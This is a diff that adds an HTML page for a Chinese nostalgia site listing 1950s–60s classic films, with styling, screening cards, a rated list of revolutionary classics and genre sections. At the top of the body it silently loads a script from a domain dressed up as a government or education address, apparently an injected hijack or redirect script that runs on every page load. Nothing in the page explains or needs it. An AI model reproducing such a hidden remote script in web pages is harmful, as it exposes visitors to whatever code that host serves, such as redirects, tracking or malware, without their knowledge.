@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>5060电影网 - 五六十年代老片放映厅</title>
+<meta name="description" content="5060电影网(5060dianyingwang-h5)主打1950-1969年中外经典老电影、红色经典、喜剧歌舞与老电影院怀旧片单，移动端自适应，必应收录友好。">
+<meta name="keywords" content="5060电影网, 5060dianyingwang-h5, 五六十年代电影, 老电影, 红色经典, 经典片单">
+<meta name="author" content="5060电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://5060dianyingwang-h5.github.io/">
+
+<style>
+:root{
+  --curtain:#7c1f1f;
+  --curtain2:#a83232;
+  --gold:#e8c468;
+  --paper:#f3ead2;
+  --ink:#2c2419;
+  --muted:#7a6a4f;
+  --screen:#0e0e0e;
+  --line:#d8c79c;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{-webkit-text-size-adjust:100%}
+body{
+  font-family:"Songti SC","Noto Serif CJK SC","PingFang SC",serif;
+  background:
+    radial-gradient(120% 60% at 50% -10%, rgba(168,50,50,.25), transparent 60%),
+    var(--paper);
+  color:var(--ink);
+  line-height:1.75;
+}
+a{color:inherit;text-decoration:none}
+img{max-width:100%;display:block}
+
+/* 幕布条 */
+.curtain-bar{
+  background:repeating-linear-gradient(90deg,var(--curtain),var(--curtain) 18px,var(--curtain2) 18px,var(--curtain2) 36px);
+  color:var(--gold);
+  text-align:center;
+  font-size:11px;
+  letter-spacing:3px;
+  padding:6px 10px;
+  font-family:Arial,sans-serif;
+}
+
+/* 头部 */
+.header{
+  max-width:1100px;margin:0 auto;
+  padding:26px 20px 16px;
+  text-align:center;
+}
+.marquee-sign{
+  display:inline-block;
+  padding:10px 22px;
+  border:2px solid var(--gold);
+  border-radius:6px;
+  background:linear-gradient(180deg,#2a0808,#4a1010);
+  color:var(--gold);
+  box-shadow:0 6px 20px rgba(124,31,31,.25);
+}
+.marquee-sign h1{font-size:30px;letter-spacing:4px}
+.marquee-sign .en{font-family:Arial,sans-serif;font-size:11px;color:#e7d3a1;letter-spacing:2px}
+.header p.slogan{margin-top:10px;color:var(--muted);font-size:13px}
+
+/* 导航 */
+.nav{
+  max-width:1100px;margin:0 auto 20px;padding:0 20px;
+  display:flex;gap:10px;justify-content:center;flex-wrap:wrap;
+}
+.nav a{
+  padding:7px 16px;border:1px solid var(--line);border-radius:20px;
+  font-size:13px;color:#5a4a30;background:#fbf4e2;
+}
+.nav a:hover,.nav a.active{background:var(--curtain);color:var(--gold);border-color:var(--curtain)}
+
+/* 主区 */
+.main{max-width:1100px;margin:0 auto;padding:0 20px 30px}
+
+/* 银幕横幅 */
+.screen-banner{
+  background:var(--screen);
+  border:6px solid #3a0d0d;
+  border-radius:10px;
+  padding:30px 24px;
+  color:#f3e9c9;
+  position:relative;
+  overflow:hidden;
+  margin-bottom:28px;
+  box-shadow:inset 0 0 60px rgba(0,0,0,.8);
+}
+.screen-banner::after{content:"🎞️";position:absolute;right:14px;bottom:-12px;font-size:110px;opacity:.08}
+.screen-banner .reel{font-family:Arial,sans-serif;font-size:12px;color:var(--gold);letter-spacing:2px}
+.screen-banner h2{font-size:25px;margin:6px 0 8px;color:#fff}
+.screen-banner p{font-size:14px;color:#cdbf95;max-width:620px}
+.screen-banner .reels{margin-top:14px;display:flex;gap:8px;flex-wrap:wrap}
+.screen-banner .reels span{padding:4px 12px;border:1px solid #5a4a30;border-radius:20px;font-size:12px;color:var(--gold)}
+
+/* 栏目头 */
+.section{margin-bottom:30px}
+.s-head{display:flex;align-items:center;gap:10px;margin-bottom:14px;border-bottom:2px dotted var(--line);padding-bottom:8px}
+.s-head .no{
+  width:30px;height:30px;border-radius:4px;
+  background:var(--curtain);color:var(--gold);
+  display:flex;align-items:center;justify-content:center;font-weight:800;font-size:14px;
+}
+.s-head h3{font-size:18px;letter-spacing:1px}
+.s-head .more{margin-left:auto;font-size:12px;color:var(--curtain);font-family:Arial,sans-serif}
+
+/* 栏目一：放映排片（票根卡片） */
+.schedule{display:grid;grid-template-columns:repeat(3,1fr);gap:16px}
+.ticket{
+  background:#fbf4e2;
+  border:1px solid var(--line);
+  border-left:6px solid var(--curtain);
+  border-radius:8px;
+  padding:16px;
+  position:relative;
+}
+.ticket::before{
+  content:"";position:absolute;left:6px;top:0;bottom:0;width:1px;
+  background:repeating-linear-gradient(var(--line),var(--line) 4px,transparent 4px,transparent 8px);
+  opacity:.4;
+}
+.ticket .year{font-family:Arial,sans-serif;font-size:12px;color:var(--curtain);font-weight:700}
+.ticket h4{font-size:16px;margin:4px 0}
+.ticket .meta{font-size:12px;color:var(--muted);font-family:Arial,sans-serif;margin-bottom:8px}
+.ticket p{font-size:13px;color:#4a3f2c}
+.ticket .genre{margin-top:10px;font-size:11px;color:var(--curtain);border:1px solid var(--line);display:inline-block;padding:2px 9px;border-radius:10px}
+
+/* 栏目二：红色经典（列表+评分） */
+.red-list{background:#fbf4e2;border:1px solid var(--line);border-radius:8px;overflow:hidden}
+.red-row{display:flex;align-items:center;gap:14px;padding:14px 16px;border-bottom:1px dashed var(--line)}
+.red-row:last-child{border-bottom:none}
+.red-no{width:30px;height:30px;border-radius:50%;background:var(--curtain);color:var(--gold);display:flex;align-items:center;justify-content:center;font-family:Arial,sans-serif;font-weight:700;flex-shrink:0}
+.red-info{flex:1}
+.red-info h4{font-size:15px}
+.red-info p{font-size:11px;color:var(--muted);font-family:Arial,sans-serif}
+.red-score{font-family:Arial,sans-serif;font-weight:800;color:var(--curtain);font-size:16px;flex-shrink:0}
+
+/* 栏目三：老放映机横向 */
+.reel-scroll{display:flex;gap:14px;overflow-x:auto;padding-bottom:10px;scroll-snap-type:x mandatory}
+.reel-card{scroll-snap-align:start;flex:0 0 210px;background:#fbf4e2;border:1px solid var(--line);border-radius:10px;overflow:hidden}
+.reel-top{height:78px;display:flex;align-items:center;justify-content:center;font-size:36px;background:linear-gradient(135deg,#7c1f1f,#a83232);color:var(--gold)}
+.reel-body{padding:12px}
+.reel-body h4{font-size:14px;margin-bottom:4px}
+.reel-body p{font-size:11px;color:var(--muted);line-height:1.5}
+
+/* 栏目四：关于 */
+.about{
+  background:#2a0808;color:#ecdcb4;border-radius:10px;padding:24px;
+  display:flex;gap:18px;align-items:flex-start;flex-wrap:wrap;
+}
+.about .proj{font-size:40px}
+.about h3{font-size:17px;color:var(--gold);margin-bottom:6px}
+.about p{font-size:13px;color:#d8c79c;max-width:640px}
+.about .url{margin-top:8px;font-family:Arial,sans-serif;font-size:12px;color:var(--gold)}
+
+/* 页脚 */
+.footer{margin-top:30px;border-top:3px double var(--line);padding:26px 20px 38px;text-align:center;color:var(--muted);font-size:12px;font-family:Arial,sans-serif}
+.footer a{color:var(--curtain)}
+.footer .fn{margin-top:12px;display:flex;justify-content:center;gap:16px;flex-wrap:wrap}
+.footer .fn a{color:var(--muted)}
+.footer .fn a:hover{color:var(--ink)}
+
+@media(max-width:860px){.schedule{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:640px){
+  .marquee-sign h1{font-size:23px}
+  .nav a{padding:6px 12px;font-size:12px}
+  .screen-banner{padding:22px 16px}
+  .screen-banner h2{font-size:20px}
+  .main{padding:0 16px 24px}
+  .schedule{grid-template-columns:1fr}
+  .red-row{flex-wrap:wrap;gap:10px}
+  .red-score{width:100%}
+  .reel-card{flex-basis:80%}
+  .about{padding:18px 14px}
+}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="curtain-bar">🎭 5060电影网 · 1950-1969 老片放映厅 · 单页自适应 · 必应收录友好</div>
+
+<header class="header">
+  <div class="marquee-sign">
+    <h1>5060电影网</h1>
+    <div class="en">5060dianyingwang-h5 · 五六十年代专场</div>
+  </div>
+  <p class="slogan">一张票根，一段流金岁月——红色经典、喜剧歌舞、黑白文艺，都在这里重映。</p>
+</header>
+
+<nav class="nav">
+  <a href="#" class="active">放映大厅</a>
+  <a href="#">红色经典</a>
+  <a href="#">喜剧歌舞</a>
+  <a href="#">黑白文艺</a>
+  <a href="#">译制外国片</a>
+  <a href="#">老导演专题</a>
+  <a href="#">关于放映厅</a>
+</nav>
+
+<div class="main">
+
+  <!-- 银幕 -->
+  <section class="screen-banner">
+    <div class="reel">REEL 01 · 本周重映</div>
+    <h2>今晚放《英雄儿女》，明晚放《刘三姐》</h2>
+    <p>5060电影网不追新片流量，只把五六十年代那些被时间抛光过的片子排进片单：银幕黑边、扩音喇叭、票根上的座位号，都是记忆的一部分。</p>
+    <div class="reels">
+      <span>1950s</span><span>1960s</span><span>红色经典</span><span>译制大片</span><span>老电影院</span>
+    </div>
+  </section>
+
+  <!-- 栏目一 -->
+  <section class="section" id="schedule">
+    <div class="s-head"><span class="no">01</span><h3>本周放映排片</h3><a class="more" href="#">全部场次 #</a></div>
+    <div class="schedule">
+      <article class="ticket">
+        <div class="year">1964</div>
+        <h4>《英雄儿女》</h4>
+        <div class="meta">武兆堤 · 战争/剧情 · 中国</div>
+        <p>“为了胜利，向我开炮！”王成的呐喊，是几代人的银幕记忆。</p>
+        <span class="genre">红色经典</span>
+      </article>
+      <article class="ticket">
+        <div class="year">1961</div>
+        <h4>《刘三姐》</h4>
+        <div class="meta">苏里 · 音乐/歌舞 · 中国</div>
+        <p>广西山水+山歌对唱，把民间传说唱成了银幕民歌教科书。</p>
+        <span class="genre">歌舞民歌</span>
+      </article>
+      <article class="ticket">
+        <div class="year">1959</div>
+        <h4>《五朵金花》</h4>
+        <div class="meta">王家乙 · 爱情/喜剧 · 中国</div>
+        <p>大理风光、白族风情、误会式喜剧，新中国轻喜剧代表作。</p>
+        <span class="genre">民族喜剧</span>
+      </article>
+      <article class="ticket">
+        <div class="year">1957</div>
+        <h4>《小城之春》重映热</h4>
+        <div class="meta">费穆(1948) · 文艺/爱情</div>
+        <p>五六十年代放映队常带的老片：残园、春风、欲说还休的东方含蓄。</p>
+        <span class="genre">黑白文艺</span>
+      </article>
+      <article class="ticket">
+        <div class="year">1956</div>
+        <h4>《上甘岭》</h4>
+        <div class="meta">沙蒙 · 战争/历史 · 中国</div>
+        <p>坑道、苹果、一首《我的祖国》，把抗美援朝拍成了集体抒情诗。</p>
+        <span class="genre">战争史诗</span>
+      </article>
+      <article class="ticket">
+        <div class="year">1965</div>
+        <h4>《地道战》</h4>
+        <div class="meta">任旭东 · 战争/喜剧 · 中国</div>
+        <p>“各村的地道连起来”，民兵智慧+人民战争，放映厅里永远有笑声。</p>
+        <span class="genre">抗战喜剧</span>
+      </article>
+    </div>
+  </section>
+
+  <!-- 栏目二 -->
+  <section class="section" id="red">
+    <div class="s-head"><span class="no">02</span><h3>红色经典 · 必看清单</h3><a class="more" href="#">完整片单 #</a></div>
+    <div class="red-list">
+      <div class="red-row">
+        <div class="red-no">1</div>
+        <div class="red-info"><h4>《英雄儿女》</h4><p>1964 · 武兆堤 · 抗美援朝</p></div>
+        <div class="red-score">9.2</div>
+      </div>
+      <div class="red-row">
+        <div class="red-no">2</div>
+        <div class="red-info"><h4>《上甘岭》</h4><p>1956 · 沙蒙 · 战争/歌曲</p></div>
+        <div class="red-score">9.0</div>
+      </div>
+      <div class="red-row">
+        <div class="red-no">3</div>
+        <div class="red-info"><h4>《地道战》</h4><p>1965 · 任旭东 · 民兵抗战</p></div>
+        <div class="red-score">8.9</div>
+      </div>
+      <div class="red-row">
+        <div class="red-no">4</div>
+        <div class="red-info"><h4>《地雷战》</h4><p>1962 · 唐英奇 · 抗战/喜剧</p></div>
+        <div class="red-score">8.8</div>
+      </div>
+      <div class="red-row">
+        <div class="red-no">5</div>
+        <div class="red-info"><h4>《红色娘子军》</h4><p>1961 · 谢晋 · 革命/女性</p></div>
+        <div class="red-score">8.7</div>
+      </div>
+      <div class="red-row">
+        <div class="red-no">6</div>
+        <div class="red-info"><h4>《白毛女》</h4><p>1950 · 王滨/水华 · 歌剧改编</p></div>
+        <div class="red-score">8.5</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目三 -->
+  <section class="section" id="reels">
+    <div class="s-head"><span class="no">03</span><h3>老放映机 · 类型抽屉</h3><a class="more" href="#">更多 #</a></div>
+    <div class="reel-scroll">
+      <div class="reel-card"><div class="reel-top">🎺</div><div class="reel-body"><h4>喜剧歌舞</h4><p>《刘三姐》《五朵金花》《花儿朵朵》</p></div></div>
+      <div class="reel-card"><div class="reel-top">🎖️</div><div class="reel-body"><h4>战争红色</h4><p>《英雄儿女》《上甘岭》《南征北战》</p></div></div>
+      <div class="reel-card"><div class="reel-top">🎭</div><div class="reel-body"><h4>黑白文艺</h4><p>《小城之春》《十字街头》《马路天使》</p></div></div>
+      <div class="reel-card"><div class="reel-top">🌍</div><div class="reel-body"><h4>译制外国片</h4><p>《乡村女教师》《攻克柏林》《静静的顿河》</p></div></div>
+      <div class="reel-card"><div class="reel-top">🎬</div><div class="reel-body"><h4>老导演专题</h4><p>谢晋 / 水华 / 崔嵬 / 桑弧</p></div></div>
+    </div>
+  </section>
+
+  <!-- 栏目四 -->
+  <section class="section" id="about">
+    <div class="s-head"><span class="no">04</span><h3>关于 5060 放映厅</h3></div>
+    <div class="about">
+      <div class="proj">🎞️</div>
+      <div>
+        <h3>不是资源站，是老片重映厅</h3>
+        <p>5060电影网（5060dianyingwang-h5）把“5060”读作五六十年代：专做 1950-1969 的中外老片、红色经典、歌舞喜剧与黑白文艺片单。内页用 # 占位，单页结构、移动端自适应，不提供盗版下载，正版修复版在哪看另说。</p>
+        <div class="url">https://5060dianyingwang-h5.github.io</div>
+      </div>
+    </div>
+  </section>
+
+</div>
+
+<footer class="footer">
+  <div>© 2026 5060电影网 | 5060dianyingwang-h5</div>
+  <div>永久地址：<a href="https://5060dianyingwang-h5.github.io">https://5060dianyingwang-h5.github.io</a></div>
+  <div>本站为老电影推荐/片单整理站，不提供盗版资源下载。</div>
+  <div class="fn">
+    <a href="#">放映厅</a><a href="#">红色经典</a><a href="#">歌舞喜剧</a><a href="#">译制片</a><a href="#">关于</a>
+  </div>
+</footer>
+
+</body>
+</html>
